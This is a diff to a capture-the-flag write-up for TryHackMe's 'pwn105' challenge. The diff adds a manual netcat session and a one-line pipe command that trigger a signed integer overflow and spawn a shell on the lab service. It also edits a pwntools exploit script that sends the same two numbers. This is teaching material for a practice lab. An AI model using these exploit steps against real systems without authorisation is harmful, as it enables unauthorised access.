@@ -163,13 +163,40 @@ thang
 
 ---
 
-## Exploit Script
+## Exploitation Strategy & Manual CLI Execution
 
-The exploit script is saved in [`exploit.py`](exploit.py):
+Because this vulnerability stems entirely from an integer boundary logic flaw without requiring payload padding, stack alignment, or memory corruption primitives, **no complex exploit script is required**. You can solve it completely by hand directly from your keyboard via Netcat (`nc`):
+
+```bash
+$ nc <TARGET_IP> 9005
+        pwn 105
+=[ BAD INTEGERS ]=-------
+|-< Enter two numbers to add >-|
+
+]>> 2000000000
+]>> 500000000
+
+[*] C: -1794967296
+[*] Popped Shell
+[*] Switching to interactive mode
+id
+uid=1001(pwn105) gid=1001(pwn105) groups=1001(pwn105)
+cat flag.txt
+THM{redacted}
+```
+
+Alternatively, you can pipe the two numbers in a single shell command:
+```bash
+(printf "2000000000\n500000000\n"; cat) | nc <TARGET_IP> 9005
+```
+
+### Optional Automation Script (`exploit.py`)
+
+For automated testing or CTF harness integration, an optional Python script is provided in [`exploit.py`](exploit.py):
 
 ```python
 #!/usr/bin/env python3
-"""TryHackMe - pwn105 Exploit Script
+"""TryHackMe - pwn105 Automation Script
 Vulnerability: Signed 32-bit Integer Overflow
 Concept: Sum of two large positive integers exceeds INT_MAX (0x7FFFFFFF),
          wrapping around to a negative value to trigger system("/bin/sh").
@@ -190,11 +217,9 @@ p = start()
 num1 = b"2000000000"
 num2 = b"500000000"
 
-log.info("Sending first positive integer...")
 p.recvuntil(b"]>> ")
 p.sendline(num1)
 
-log.info("Sending second positive integer...")
 p.recvuntil(b"]>> ")
 p.sendline(num2)
 
